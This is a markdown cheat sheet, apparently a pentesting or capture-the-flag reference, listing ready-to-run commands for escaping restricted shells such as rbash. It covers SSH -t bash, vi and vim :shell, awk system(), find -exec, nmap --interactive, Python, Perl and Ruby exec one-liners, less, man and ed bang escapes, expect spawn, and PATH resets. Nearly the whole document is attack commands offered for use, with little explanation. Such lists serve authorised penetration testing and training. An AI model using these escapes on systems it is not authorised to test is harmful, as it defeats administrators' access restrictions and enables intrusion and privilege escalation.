# Restricted Shell Escapes

Breaking out of rbash, rksh, rzsh, and limited shells.

---

### Identify restricted shell

Check what you're working with

```bash
echo $SHELL
echo $0
echo $PATH
```

---

### SSH escape

Bypass restricted shell at login

```bash
ssh user@$IP -t bash
ssh user@$IP -t /bin/sh
ssh user@$IP -t "bash --noprofile"
```

---

### vi / vim escape

Open vi then spawn shell

```bash
vi
:set shell=/bin/bash
:shell
# Or: :!/bin/bash
```

---

### awk / find / nmap escape

Common binary escapes

```bash
awk 'BEGIN {system("/bin/bash")}'
find / -exec /bin/bash \;
nmap --interactive  # nmap < 5.35
!sh
```

---

### Python/Perl/Ruby escape

Scripting language shells

```bash
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
```

---

### less/more/man escape

Pager commands — Drop to shell

```bash
less /etc/passwd
!/bin/bash

man man
!/bin/bash
```

---

### PATH manipulation

If PATH is restricted — Set it manually

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

### ed / expect escape

Less common escapes

```bash
ed
!'/bin/bash'

expect -c 'spawn /bin/bash; interact'
```

---
